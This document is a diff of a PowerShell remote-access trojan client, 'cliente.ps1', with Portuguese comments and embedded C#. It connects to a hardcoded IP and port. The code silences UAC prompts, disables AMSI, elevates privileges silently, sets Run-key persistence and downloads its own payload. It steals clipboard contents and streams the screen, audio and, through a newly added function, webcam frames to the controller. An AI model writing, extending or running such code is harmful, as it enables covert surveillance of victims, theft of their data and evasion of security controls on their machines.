@@ -1,5 +1,4 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent Completo: Sem pedir reboot, UAC silenciado, Persistencia, Clipboard, Audio
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -25,9 +24,8 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
-    # 1. Silenciar o UAC SEM REINICIAR O PC
+    # 1. Silenciar o UAC
     try {
-        # Apenas remove o prompt de consentimento (não altera o EnableLUA)
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
     } catch {}
@@ -63,7 +61,7 @@ if ($args -notcontains "-silent") {
         } catch {}
     }
 
-    # 3. Instalar arquivos e persistência
+    # 3. Instalar arquivos
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
@@ -82,6 +80,7 @@ while (`$true) {
 "@
     Set-Content -Path $bootPath -Value $bootContent -Force -ErrorAction SilentlyContinue
 
+    # 4. Persistência
     $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
@@ -128,7 +127,7 @@ while (`$true) {
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
-# AUTO-ELEVAÇÃO SILENCIOSA (Fodhelper Bypass)
+# AUTO-ELEVAÇÃO SILENCIOSA
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     try {
@@ -232,6 +231,7 @@ if (-not ("R9KAgent" -as [type])) {
 
         static string IP; static int PORT;
         static volatile bool streaming = false;
+        static volatile bool isCamRunning = false;
         static volatile bool isAudioRunning = false;
         static object writeLock = new object();
         static object capLock = new object();
@@ -300,6 +300,7 @@ if (-not ("R9KAgent" -as [type])) {
                 } catch {
                 } finally {
                     streaming = false;
+                    isCamRunning = false;
                     isAudioRunning = false;
                     globalWriter = null;
                     try { if (myClient != null) myClient.Close(); } catch {}
@@ -459,6 +460,44 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
+        static void StartWebcamStream() {
+            if (isCamRunning) return;
+            isCamRunning = true;
+            Thread t = new Thread(() => {
+                IntPtr capWnd = capCreateCaptureWindow("R9KCapStream", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
+                if (capWnd == IntPtr.Zero) { isCamRunning = false; return; }
+                if (SendMessage(capWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero) == IntPtr.Zero) {
+                    DestroyWindow(capWnd); isCamRunning = false; return;
+                }
+                string tempBmp = Path.Combine(Path.GetTempPath(), "r9k_cam_stream.bmp");
+                while (isCamRunning && globalWriter != null) {
+                    SendMessage(capWnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
+                    IntPtr r = SendMessage(capWnd, WM_CAP_FILE_SAVEDIB, IntPtr.Zero, tempBmp);
+                    if (r != IntPtr.Zero && File.Exists(tempBmp)) {
+                        try {
+                            using (Bitmap bmp = new Bitmap(tempBmp)) {
+                                using (MemoryStream ms = new MemoryStream()) {
+                                    EnsureJpegCodec(70);
+                                    bmp.Save(ms, jpgCodec, jpgParams);
+                                    string b64 = Convert.ToBase64String(ms.ToArray());
+                                    lock (writeLock) {
+                                        if (globalWriter != null) globalWriter.WriteLine("WEBCAM:" + b64);
+                                    }
+                                }
+                            }
+                            File.Delete(tempBmp);
+                        } catch {}
+                    }
+                    Thread.Sleep(150); // Aproximadamente 6 a 7 FPS para não sobrecarregar o VfW
+                }
+                SendMessage(capWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
+                DestroyWindow(capWnd);
+            });
+            t.SetApartmentState(ApartmentState.STA); // VfW exige STA
+            t.IsBackground = true;
+            t.Start();
+        }
+
         static void StartAudio() {
             if (isAudioRunning) return;
             isAudioRunning = true;
@@ -565,44 +604,6 @@ if (-not ("R9KAgent" -as [type])) {
             t.SetApartmentState(ApartmentState.STA); t.IsBackground = true; t.Start();
         }
 
-        static string CaptureWebcam() {
-            IntPtr capWnd = IntPtr.Zero;
-            string tempBmp = Path.Combine(Path.GetTempPath(), "r9k_cam_" + Guid.NewGuid().ToString("N") + ".bmp");
-            try {
-                capWnd = capCreateCaptureWindow("R9KCap", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
-                if (capWnd == IntPtr.Zero) return null;
-                if (SendMessage(capWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero) == IntPtr.Zero) return null;
-                SendMessage(capWnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
-                IntPtr r = SendMessage(capWnd, WM_CAP_FILE_SAVEDIB, IntPtr.Zero, tempBmp);
-                if (r == IntPtr.Zero || !File.Exists(tempBmp)) return null;
-                EnsureJpegCodec(70);
-                using (Bitmap bmp = new Bitmap(tempBmp)) {
-                    int maxW = 1280;
-                    Bitmap finalBmp = bmp;
-                    if (bmp.Width > maxW) {
-                        int nw = maxW, nh = (int)(bmp.Height * ((float)maxW / bmp.Width));
-                        finalBmp = new Bitmap(nw, nh);
-                        using (Graphics g = Graphics.FromImage(finalBmp)) {
-                            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
-                            g.DrawImage(bmp, 0, 0, nw, nh);
-                        }
-                    }
-                    using (MemoryStream ms = new MemoryStream()) {
-                        finalBmp.Save(ms, jpgCodec, jpgParams);
-                        if (finalBmp != bmp) finalBmp.Dispose();
-                        return Convert.ToBase64String(ms.ToArray());
-                    }
-                }
-            } catch { return null; }
-            finally {
-                if (capWnd != IntPtr.Zero) {
-                    try { SendMessage(capWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero); } catch {}
-                    try { DestroyWindow(capWnd); } catch {}
-                }
-                try { if (File.Exists(tempBmp)) File.Delete(tempBmp); } catch {}
-            }
-        }
-
         static string GetClipboardText() {
             for (int i = 0; i < 5; i++) {
                 if (OpenClipboard(IntPtr.Zero)) {
@@ -646,17 +647,13 @@ if (-not ("R9KAgent" -as [type])) {
             try {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
+                
+                if (cmd == "webcam_start") { StartWebcamStream(); lock(writeLock) { myWriter.WriteLine("WEBCAM_ON"); } return; }
+                if (cmd == "webcam_stop") { isCamRunning = false; lock(writeLock) { myWriter.WriteLine("WEBCAM_OFF"); } return; }
+                
                 if (cmd == "audio_start") { StartAudio(); lock(writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
                 if (cmd == "audio_stop") { isAudioRunning = false; lock(writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
 
-                if (cmd == "webcam") {
-                    string b64 = CaptureWebcam();
-                    lock (writeLock) {
-                        if (b64 != null) myWriter.WriteLine("WEBCAM:" + b64);
-                        else myWriter.WriteLine("CAM_ERR:no_camera");
-                    }
-                    return;
-                }
                 if (cmd == "monitor_next") {
                     int n = Screen.AllScreens.Length;
                     if (n > 1) { currentScreen = (currentScreen + 1) % n; lock (writeLock) { myWriter.WriteLine("MONITOR:" + currentScreen + "/" + n); } }
